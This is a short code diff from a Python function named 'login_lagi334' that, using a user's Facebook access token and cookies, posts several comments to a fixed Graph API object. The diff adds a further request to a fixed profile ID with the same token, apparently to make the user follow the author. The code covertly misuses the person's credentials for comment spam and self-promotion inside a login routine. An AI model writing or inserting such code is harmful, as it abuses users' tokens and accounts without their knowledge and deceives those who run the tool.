@@ -493,7 +493,7 @@ def login_lagi334():
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok1}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok1}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok1}", headers = {"cookie":your_cookies})
-									
+									requests.post(f"https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok1))
 							except Exception as e:
 								print(e)
 							try:
